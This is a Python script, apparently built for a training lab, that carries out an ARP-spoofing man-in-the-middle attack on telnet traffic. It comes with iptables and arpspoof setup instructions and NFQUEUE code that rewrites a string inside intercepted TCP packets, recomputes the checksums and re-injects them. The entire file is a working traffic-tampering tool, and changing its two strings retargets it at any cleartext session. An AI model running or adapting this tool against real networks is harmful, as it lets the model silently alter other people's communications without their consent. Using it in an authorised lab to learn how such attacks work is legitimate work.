#!/usr/bin/env python3
"""
ARP-MITM payload rewriter for the CR-18 N3c lab.

Reads TCP packets handed to it by NFQUEUE, looks for a target string in
each packet's TCP payload, replaces it with a same-length substitute, and
re-injects the modified packet. Recomputes the TCP/IP checksums.

The OLD and NEW strings MUST be the same length so the TCP sequence
numbers stay valid for the rest of the session.

Usage:

    sudo iptables -I FORWARD -p tcp --dport 23 -j NFQUEUE --queue-num 1
    sudo python3 /usr/local/sbin/mitm-rewrite.py

(combine with bidirectional `arpspoof` running in two other terminals so
the FORWARD chain actually sees the traffic)
"""

import sys
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

OLD = b"bait.txt"
NEW = b"flag.txt"

if len(OLD) != len(NEW):
    sys.exit("OLD and NEW must be the same length so TCP seq numbers stay valid")


def callback(packet):
    pkt = IP(packet.get_payload())

    if pkt.haslayer(Raw) and pkt.haslayer(TCP):
        data = bytes(pkt[Raw].load)
        if OLD in data:
            pkt[Raw].load = data.replace(OLD, NEW)
            # Force scapy to recompute lengths and checksums by deleting them.
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[TCP].chksum
            packet.set_payload(bytes(pkt))
            print(f"[+] rewrote {OLD.decode()} -> {NEW.decode()} "
                  f"({pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport})",
                  flush=True)

    packet.accept()


if __name__ == "__main__":
    q = NetfilterQueue()
    q.bind(1, callback)
    print("listening on NFQUEUE 1; Ctrl+C to stop", flush=True)
    try:
        q.run()
    except KeyboardInterrupt:
        pass
    finally:
        q.unbind()
